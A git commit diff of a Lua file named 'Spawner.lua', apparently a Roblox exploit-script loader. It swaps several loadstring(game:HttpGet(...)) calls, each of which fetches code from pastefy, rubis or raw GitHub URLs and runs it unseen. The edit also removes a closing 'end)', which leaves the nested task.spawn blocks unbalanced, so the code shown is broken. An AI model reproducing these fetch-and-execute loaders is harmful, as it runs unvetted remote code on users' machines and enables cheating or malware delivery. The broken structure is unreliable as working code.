0e23562d167647d4efb6c2048b635d6a8cd9fa98
ronikscripts <roatrystan@gmail.com>
2025-08-03 19:34:54 -0700

    Update Spawner.lua

--- Spawner.lua
+++ Spawner.lua
@@ -1,16 +1,12 @@
--- Load the first script
-loadstring(game:HttpGet("https://pastefy.app/G5j1Jn9m/raw"))()
-
 -- Run additional scripts concurrently
 pcall(function()
     -- Script with delay to reduce freezing
     task.spawn(function()
         task.wait(8)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))()
-    end)
-
+        loadstring(game:HttpGet("https://pastefy.app/WSK3A4e9/raw"))()
     -- Script that runs immediately
     task.spawn(function()
         loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/HYyF83MW2AqMAnmE/raw", true))()
     end)
 end)
+
